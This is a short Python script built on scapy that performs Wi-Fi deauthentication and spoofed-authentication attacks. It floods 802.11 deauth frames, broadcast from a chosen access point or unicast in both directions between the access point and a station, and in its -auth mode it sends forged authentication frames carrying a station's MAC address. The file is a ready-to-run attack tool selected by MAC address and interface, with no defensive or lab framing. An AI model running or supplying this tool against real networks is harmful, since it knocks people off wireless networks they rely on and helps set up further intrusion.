from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Auth, RadioTap
import argparse

broadcast = "ff:ff:ff:ff:ff:ff"

def deauthAttack(interface, ap, station=None):
    target = ""
    gateway = ""

    if station is None:
        # AP broadcast
        target = broadcast
        gateway = ap
        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)
    else:
        # AP unicast
        target = station
        gateway = ap
        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)

        # Station unicast
        target = ap
        gateway = station
        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)

def authAttack(interface, ap, station):
    target = ap
    gateway = station
    pkt = RadioTap() / Dot11(type=0, subtype=11, addr1=target, addr2=gateway, addr3=gateway) / Dot11Auth(seqnum=1)
    sendp(pkt, inter=0.1, count=50, iface=interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', help=' : Interface')
    parser.add_argument('ap', metavar='MAC', help=' : AP MAC')
    parser.add_argument('-c', metavar='MAC', help=' : Station MAC')
    parser.add_argument('-auth', action='store_true', help=' : Auth Attack')
    args = parser.parse_args()
    if (args.interface is None) or (args.ap is None):
        print("Insufficient Args")
    else:
        if args.auth:
            authAttack(args.interface, args.ap, args.c)
        else:
            deauthAttack(args.interface, args.ap, args.c)




